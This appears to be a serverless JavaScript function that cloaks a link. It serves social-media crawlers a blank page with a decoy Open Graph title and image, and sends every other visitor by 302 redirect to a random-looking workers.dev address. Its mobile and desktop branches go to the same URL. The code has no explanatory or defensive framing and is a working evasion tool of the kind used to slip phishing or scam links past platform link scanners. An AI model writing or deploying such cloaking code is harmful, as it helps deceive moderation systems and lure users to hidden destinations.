export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="goasdmre.vercel.app">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://neighborly-bison-690.convex.cloud/api/storage/c4b390b6-50df-4d41-b302-8b1b71adadba">
    <meta property="og:url" content="https://sfdsfdrea.nazimzour365.workers.dev/">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://sfdsfdrea.nazimzour365.workers.dev/", 302);
  } else {
    return Response.redirect("https://sfdsfdrea.nazimzour365.workers.dev/", 302);
  }
}
